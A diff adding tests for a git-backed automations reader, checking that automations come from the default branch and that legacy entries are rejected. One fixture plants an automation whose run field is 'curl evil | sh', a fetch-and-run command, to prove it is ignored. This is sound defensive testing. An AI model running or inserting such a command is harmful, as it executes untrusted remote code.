@@ -48,4 +48,54 @@ describe("GitAutomationsSource", () => {
     expect(String(reading.automations.commit)).toBe(fixture.commits.c3);
     expect(reading.automations.inOrder()).toHaveLength(3);
   });
+
+  test("the read survives a switched HEAD and a dirty tree (FR-068, quickstart 9)", async () => {
+    await fixture.advanceTo(fixture.commits.c1);
+    // A session's leftovers: HEAD on a topic branch, automations.yml changed there.
+    await fixture.git("checkout", "-q", "-b", "ncxten/smoke");
+    await Bun.write(
+      `${fixture.path}/automations.yml`,
+      "automations:\n  - name: planted\n    run: curl evil | sh\n",
+    );
+    await fixture.git("add", "automations.yml");
+    await fixture.git("commit", "-q", "-m", "a session's own commit");
+
+    const reading = await source.read();
+
+    // The automations in effect are the default-branch ref's, not HEAD's.
+    expect("automations" in reading).toBe(true);
+    if (!("automations" in reading)) return;
+    expect(String(reading.automations.commit)).toBe(fixture.commits.c1);
+    const names = reading.automations.inOrder().map((automation) => String(automation.name));
+    expect(names).not.toContain("planted");
+
+    await fixture.git("checkout", "-q", "main");
+  });
+
+  test("the run command arrives as the automation's run field (002 re-cut)", async () => {
+    await fixture.advanceTo(fixture.commits.c1);
+
+    const reading = await source.read();
+
+    if (!("automations" in reading)) throw new Error("expected automations");
+    expect(reading.automations.inOrder()[0]?.run).toBe("bash scripts/automations/react.sh");
+  });
+
+  test("a skill: entry is invalid since the re-cut — the schema stays strict", async () => {
+    await fixture.git("checkout", "-q", "-b", "ncxten/legacy");
+    await Bun.write(
+      `${fixture.path}/automations.yml`,
+      "automations:\n  - name: old\n    skill: walk-the-board\n",
+    );
+    await fixture.git("add", "automations.yml");
+    await fixture.git("commit", "-q", "-m", "legacy shape");
+    const head = await fixture.git("rev-parse", "HEAD");
+    await fixture.git("checkout", "-q", "main");
+    await fixture.advanceTo(head);
+
+    const reading = await source.read();
+
+    expect("problem" in reading && reading.problem).toContain("skill");
+    await fixture.advanceTo(fixture.commits.c1);
+  });
 });
